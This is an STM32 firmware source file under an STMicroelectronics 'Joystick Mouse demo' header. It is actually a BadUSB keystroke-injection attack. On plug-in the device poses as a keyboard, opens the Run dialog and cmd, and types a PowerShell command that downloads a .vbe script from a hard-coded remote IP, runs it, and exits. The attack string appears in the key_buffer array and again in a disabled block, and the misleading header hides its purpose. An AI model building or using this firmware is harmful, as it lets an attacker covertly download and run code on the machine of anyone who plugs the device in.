/******************** (C) COPYRIGHT 2007 STMicroelectronics ********************
* File Name          : main.c
* Author             : MCD Application Team
* Version            : V1.0
* Date               : 10/08/2007
* Description        : Joystick Mouse demo main file
********************************************************************************
* THE PRESENT SOFTWARE WHICH IS FOR GUIDANCE ONLY AIMS AT PROVIDING CUSTOMERS
* WITH CODING INFORMATION REGARDING THEIR PRODUCTS IN ORDER FOR THEM TO SAVE TIME.
* AS A RESULT, STMICROELECTRONICS SHALL NOT BE HELD LIABLE FOR ANY DIRECT,
* INDIRECT OR CONSEQUENTIAL DAMAGES WITH RESPECT TO ANY CLAIMS ARISING FROM THE
* CONTENT OF SUCH SOFTWARE AND/OR THE USE MADE BY CUSTOMERS OF THE CODING
* INFORMATION CONTAINED HEREIN IN CONNECTION WITH THEIR PRODUCTS.
*******************************************************************************/

/* Includes ------------------------------------------------------------------*/
#include <string.h>
#include "stm32f10x_lib.h"
#include "usb_lib.h"
#include "hw_config.h"

typedef          int   int32_t;
typedef unsigned int   uint32_t;
typedef unsigned char  uint8_t;
typedef unsigned short uint16_t;

char *key_buffer[4] = {
	"p1wershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n\0\0\0\0\0\0\0\0\0\0\0\0",
	"D:\\test.vbe\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
	"exit\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
	"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
};

u8 Buffer_Shift[8]   = {0x2, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Shift
u8 Buffer_Win[8]     = {0x8, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Win
u8 Buffer_Win_R[8]   = {0x8, 0, 0x15, 0, 0, 0, 0, 0}; //Keyboard R
u8 buffer_release[8] = {0, 0, 0, 0, 0, 0, 0, 0};
	 
char sys_banner[] = {"badusb system buildtime [" __TIME__ " " __DATE__ "] "};

void Delay(vu32 nCount);
/* ############################ gpio driver start ############################# */
enum GPIO_GROUP
{
	GROUPA = 0xA,
	GROUPB = 0xB,
	GROUPC = 0xC,
	GROUPD = 0xD,
	GROUPE = 0xE,
	GROUPF = 0xF,
	GROUPG = 0xF + 1,
};

int32_t gpio_write(uint32_t group, uint32_t index, uint32_t bit);
int32_t gpio_read(uint32_t group, uint32_t index);
int32_t gpio_init(uint32_t group, uint32_t index, uint32_t mode);

#define GPIO_ADDR(group) ((GPIO_TypeDef *)(GPIOA_BASE + 0x400 * (group - GROUPA)))

int32_t gpio_write(uint32_t group, uint32_t index, uint32_t bit)
{
	if (group < GROUPA && group > GROUPG) {
		//Usart_SendString( DEBUG_USARTx,"gpio_write invalid group!\n");
		return -1;
	}
	if (index > 16) { /* 0 - 15 */		
		//Usart_SendString( DEBUG_USARTx,"gpio_write invalid index!\n");
		return -1;
	}

	if (bit) {
		GPIO_SetBits(GPIO_ADDR(group), 0x1 << index);
	} else {
		GPIO_ResetBits(GPIO_ADDR(group), 0x1 << index);
	}
	
	return 0;
}

int32_t gpio_read(uint32_t group, uint32_t index)
{
	if (group < GROUPA && group > GROUPG) {
		//Usart_SendString( DEBUG_USARTx,"gpio_read invalid group!\n");
		return -1;
	}
	if (index > 16) { /* 0 - 15 */
		//Usart_SendString( DEBUG_USARTx,"gpio_read invalid index!\n");
		return -1;
	}

	return  GPIO_ReadInputDataBit(GPIO_ADDR(group), 0x1 << index);
}

int32_t gpio_init(uint32_t group, uint32_t index, uint32_t mode)
{
	GPIO_InitTypeDef GPIO_InitStructure;

	if (group < GROUPA && group > GROUPG) {
		//Usart_SendString( DEBUG_USARTx,"gpio_init invalid group!\n");
		return -1;
	}
	if (index > 16) { /* 0 - 15 */
		//Usart_SendString( DEBUG_USARTx,"gpio_init invalid index!\n");
		return -1;
	}

	RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA << (group - GROUPA), ENABLE);	/* ??GPIO?? */

	GPIO_InitStructure.GPIO_Pin = (0x1 << index);
	GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
	GPIO_InitStructure.GPIO_Mode = (GPIOMode_TypeDef)mode /* GPIO_Mode_Out_PP */;
	GPIO_Init(GPIO_ADDR(group), &GPIO_InitStructure);
	return 0;
}

/* ############################ gpio driver end ############################# */

/* ############################ uart driver start ############################# */
#include "stm32f10x_map.h"
#include "stm32f10x_usart.h"
#include "stdio.h"

#define  DEBUG_USARTx                   ((USART_TypeDef *) USART2_BASE)
#define  DEBUG_USART_CLK                RCC_APB1Periph_USART2
#define  DEBUG_USART_APBxClkCmd         RCC_APB1PeriphClockCmd
#define  DEBUG_USART_BAUDRATE           9600

// USART GPIO 引脚宏定义
#define  DEBUG_USART_GPIO_CLK           (RCC_APB2Periph_GPIOA)
#define  DEBUG_USART_GPIO_APBxClkCmd    RCC_APB2PeriphClockCmd
    
#define  DEBUG_USART_TX_GPIO_PORT        ((GPIO_TypeDef *) GPIOA_BASE)
#define  DEBUG_USART_TX_GPIO_PIN          GPIO_Pin_2
#define  DEBUG_USART_RX_GPIO_PORT        ((GPIO_TypeDef *) GPIOA_BASE)
#define  DEBUG_USART_RX_GPIO_PIN        GPIO_Pin_3

#define  DEBUG_USART_IRQ                USART2_IRQChannel
#define  DEBUG_USART_IRQHandler         USART2_IRQHandler
 /**
  * @brief  配置嵌套向量中断控制器NVIC
  * @param  无
  * @retval 无
  */
static void NVIC_Configuration(void)
{
  NVIC_InitTypeDef NVIC_InitStructure;
  
  /* 嵌套向量中断控制器组选择 */
  NVIC_PriorityGroupConfig(NVIC_PriorityGroup_2);
  
  /* 配置USART为中断源 */
  NVIC_InitStructure.NVIC_IRQChannel = DEBUG_USART_IRQ;
  /* 抢断优先级*/
  NVIC_InitStructure.NVIC_IRQChannelPreemptionPriority = 1;
  /* 子优先级 */
  NVIC_InitStructure.NVIC_IRQChannelSubPriority = 1;
  /* 使能中断 */
  NVIC_InitStructure.NVIC_IRQChannelCmd = ENABLE;
  /* 初始化配置NVIC */
  NVIC_Init(&NVIC_InitStructure);
}

 /**
  * @brief  USART GPIO 配置,工作参数配置
  * @param  无
  * @retval 无
  */
void USART_Config(void)
{
	GPIO_InitTypeDef GPIO_InitStructure;
	USART_InitTypeDef USART_InitStructure;

	// 打开串口GPIO的时钟
	DEBUG_USART_GPIO_APBxClkCmd(DEBUG_USART_GPIO_CLK, ENABLE);
	
	// 打开串口外设的时钟
	DEBUG_USART_APBxClkCmd(DEBUG_USART_CLK, ENABLE);

	// 将USART Tx的GPIO配置为推挽复用模式
	GPIO_InitStructure.GPIO_Pin = DEBUG_USART_TX_GPIO_PIN;
	GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AF_PP;
	GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
	GPIO_Init(DEBUG_USART_TX_GPIO_PORT, &GPIO_InitStructure);

  // 将USART Rx的GPIO配置为浮空输入模式
	GPIO_InitStructure.GPIO_Pin = DEBUG_USART_RX_GPIO_PIN;
	GPIO_InitStructure.GPIO_Mode = GPIO_Mode_IN_FLOATING;
	GPIO_Init(DEBUG_USART_RX_GPIO_PORT, &GPIO_InitStructure);
	
	// 配置串口的工作参数
	// 配置波特率
	USART_InitStructure.USART_BaudRate = DEBUG_USART_BAUDRATE;
	// 配置 针数据字长
	USART_InitStructure.USART_WordLength = USART_WordLength_8b;
	// 配置停止位
	USART_InitStructure.USART_StopBits = USART_StopBits_1;
	// 配置校验位
	USART_InitStructure.USART_Parity = USART_Parity_No ;
	// 配置硬件流控制
	USART_InitStructure.USART_HardwareFlowControl = USART_HardwareFlowControl_None;
	// 配置工作模式，收发一起
	USART_InitStructure.USART_Mode = USART_Mode_Rx | USART_Mode_Tx;
	// 完成串口的初始化配置
	USART_Init(DEBUG_USARTx, &USART_InitStructure);
	
	// 串口中断优先级配置
	NVIC_Configuration();
	
	// 使能串口接收中断
	USART_ITConfig(DEBUG_USARTx, USART_IT_RXNE, ENABLE);	
	
	// 使能串口
	USART_Cmd(DEBUG_USARTx, ENABLE);		

  // 清除发送完成标志
	//USART_ClearFlag(USART1, USART_FLAG_TC);     
}

/*****************  发送一个字符 **********************/
void Usart_SendByte( USART_TypeDef * pUSARTx, uint8_t ch)
{
	/* 发送一个字节数据到USART */
	USART_SendData(pUSARTx,ch);
		
	/* 等待发送数据寄存器为空 */
	while (USART_GetFlagStatus(pUSARTx, USART_FLAG_TXE) == RESET);	
}

/*****************  发送字符串 **********************/
void Usart_SendString( USART_TypeDef * pUSARTx, char *str)
{
	unsigned int k=0;
  do 
  {
      Usart_SendByte( pUSARTx, *(str + k) );
      k++;
  } while(*(str + k)!='\0');
  
  /* 等待发送完成 */
  while(USART_GetFlagStatus(pUSARTx,USART_FLAG_TC)==RESET)
  {}
}

/*****************  发送一个16位数 **********************/
void Usart_SendHalfWord( USART_TypeDef * pUSARTx, uint16_t ch)
{
	uint8_t temp_h, temp_l;
	
	/* 取出高八位 */
	temp_h = (ch&0XFF00)>>8;
	/* 取出低八位 */
	temp_l = ch&0XFF;
	
	/* 发送高八位 */
	USART_SendData(pUSARTx,temp_h);	
	while (USART_GetFlagStatus(pUSARTx, USART_FLAG_TXE) == RESET);
	
	/* 发送低八位 */
	USART_SendData(pUSARTx,temp_l);	
	while (USART_GetFlagStatus(pUSARTx, USART_FLAG_TXE) == RESET);	
}

void DEBUG_USART_IRQHandler(void)
{
  uint8_t ucTemp;
	Usart_SendString( DEBUG_USARTx,"enter uart irq handler!\r\n");
	if(USART_GetITStatus(DEBUG_USARTx,USART_IT_RXNE)!=RESET)
	{		
		ucTemp = USART_ReceiveData(DEBUG_USARTx);
		printf("get [%c]\r\n", ucTemp);
    USART_SendData(DEBUG_USARTx,ucTemp);    
	}	 
}

///重定向c库函数printf到串口，重定向后可使用printf函数
int fputc(int ch, FILE *f)
{
		/* 发送一个字节数据到串口 */
		USART_SendData(DEBUG_USARTx, (uint8_t) ch);
		
		/* 等待发送完毕 */
		while (USART_GetFlagStatus(DEBUG_USARTx, USART_FLAG_TXE) == RESET);		
	
		return (ch);
}

///重定向c库函数scanf到串口，重写向后可使用scanf、getchar等函数
int fgetc(FILE *f)
{
		/* 等待串口输入数据 */
		while (USART_GetFlagStatus(DEBUG_USARTx, USART_FLAG_RXNE) == RESET);

		return (int)USART_ReceiveData(DEBUG_USARTx);
}

/* ############################ uart driver end   ############################# */
void delay(uint32_t t)
{
	uint32_t i, x;
	for(i = 0; i < 100; i++) {
		for(x = 0; x < t; x++) {
			__asm { nop };
		}
	}
}

/* gpio functions */

void __keyboard_send(u8 *Buffer)
{

		/*copy mouse position info in ENDP1 Tx Packet Memory Area*/
		UserToPMABufferCopy(Buffer, GetEPTxAddr(ENDP1), 8);
		/* enable endpoint for transmission */
		SetEPTxValid(ENDP1);
		Delay(1000000);
}

int keyboard_send_ascii(u8 c)
{
	u8 capital = 0;
	u8 hid_code;
	u8 buffer[8] = {0, 0, 0, 0, 0, 0, 0, 0};
	
	if (c >= 'a' && c <= 'z') {
		hid_code = 0x04 + (c - 'a');
	} else if (c >= 'A' && c <= 'Z') {
		hid_code = 0x04 + (c - 'A');
		capital = 1;
	} else if (c >= '0' && c <= '9') {
		if (c == '0') {
			hid_code = 0x27;
		} else {
			hid_code = 0x1E + (c - '1');
		}	
	} else {
			
		switch (c) {
			case (':'): /* ':' = capital(';') */
				hid_code = 0x33;
				capital = 1;
				break;		
			case ('\"'): /* '\"' = capital(''') */
				hid_code = 0x34;
				capital = 1;
				break;		
			case ('('): /* '(' = capital('9') */
				hid_code = 0x26;
				capital = 1;
				break;		
			case (')'): /* '(' = capital('0') */
				hid_code = 0x27;
				capital = 1;
				break;					
			case (' '):
				hid_code = 0x2C;
				break;
			case ('-'):
				hid_code = 0x2d;
				break;
			case ('='):
				hid_code = 0x2E;
				break;
			case ('\\'):
				hid_code = 0x31;
				break;
			case ('\''):
				hid_code = 0x34;
				break;
			case (','):
				hid_code = 0x36;
				break;
			case ('.'):
				hid_code = 0x37;
				break;
			case ('/'):
				hid_code = 0x38;
				break;			
			case ('\n'):
				hid_code = 0x28;
				break;
			default:
				return -1;
		}
	}
	buffer[2] = hid_code;
	
	if (capital) {
		buffer[0] = 0x2;
		__keyboard_send(Buffer_Shift);
	}

	__keyboard_send(buffer);
	
	if (capital) {
		__keyboard_send(Buffer_Shift);
	}
	
	__keyboard_send(buffer_release);
	return 0;
}


int keyboard_send_string(char *s)
{
	int i;
	
	for(i = 0; s[i] != '\0'; i++) {
			keyboard_send_ascii(s[i]);
	}
	
	return 0;
}

void __local_irq_disable(void)
{
	__asm { cpsid i };
}

void __local_irq_enable(void)
{
	__asm { cpsie i };
}

#define DUMP_VAR4(var)          printf(#var":\t 0x%08x\n", var)
int main(void)
{
	uint32_t i;

#ifdef DEBUG
  debug();
#endif
#if 0
	flash_load_base  = (uint32_t)&Load$$ER_IROM1$$Base;
	flash_image_base = (uint32_t)&Image$$ER_IROM1$$Base;
	flash_image_size = (uint32_t)&Image$$ER_IROM1$$Length;

	ram_load_base  = (uint32_t)&Load$$RW_IRAM1$$Base;
	ram_image_base = (uint32_t)&Image$$RW_IRAM1$$Base;
	ram_image_size = (uint32_t)&Image$$RW_IRAM1$$Length;

	DUMP_VAR4(flash_load_base);
	DUMP_VAR4(flash_image_base);
	DUMP_VAR4(flash_image_size);
	DUMP_VAR4(ram_load_base);
	DUMP_VAR4(ram_image_base);
	DUMP_VAR4(ram_image_size);
#endif
	__local_irq_disable();
	*((volatile int *)(0xe000ed08)) = 0x0800e000;	/* set the VTOR */
	__local_irq_enable();
	
  Set_System();

  USB_Interrupts_Config();
#if 0
	USART_Config();
	gpio_init(GROUPB, 1, GPIO_Mode_Out_PP);
	
	Usart_SendString( DEBUG_USARTx,"test...\r\n");
	printf("%s\n", sys_banner);
	printf("");
#endif

  Set_USBClock();

  USB_Init();
	
  Delay(10000000);
	
  while (1)
  {
    Delay(10000);
		__keyboard_send(Buffer_Win);

		__keyboard_send(Buffer_Win_R);

		__keyboard_send(Buffer_Win);

		__keyboard_send(buffer_release);	
		
		//keyboard_send_string("CMD\n\n");
		//keyboard_send_string("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
		keyboard_send_string("cmd\n\n");
		
		/*******switch the input method to english **********/
		__keyboard_send(Buffer_Shift);
		__keyboard_send(buffer_release);
		/****************************************************/
		
		for(i = 0; i < 4; i++) {
			if (strlen(key_buffer[i]) != 0) {
				keyboard_send_string(key_buffer[i]);
			}
		}
#if 0
		keyboard_send_string("powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n");
		keyboard_send_string("D:\\test.vbe\n");
		keyboard_send_string("exit\n");
#endif
		break;
  }

	while(1)
	{	
		gpio_write(GROUPB, 1, 0);
		delay(1000);
		gpio_write(GROUPB, 1, 1);
		delay(1000);
	}
	
}

/*******************************************************************************
* Function Name  : Delay
* Description    : Inserts a delay time.
* Input          : nCount: specifies the delay time length.
* Output         : None
* Return         : None
*******************************************************************************/
void Delay(vu32 nCount)
{
  for(; nCount!= 0;nCount--);
}

#ifdef  DEBUG
/*******************************************************************************
* Function Name  : assert_failed
* Description    : Reports the name of the source file and the source line number
*                  where the assert_param error has occurred.
* Input          : - file: pointer to the source file name
*                  - line: assert_param error line source number
* Output         : None
* Return         : None
*******************************************************************************/
void assert_failed(u8* file, u32 line)
{ 
  /* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */

  /* Infinite loop */
  while(1)
  {
  }
}
#endif

/******************* (C) COPYRIGHT 2007 STMicroelectronics *****END OF FILE****/
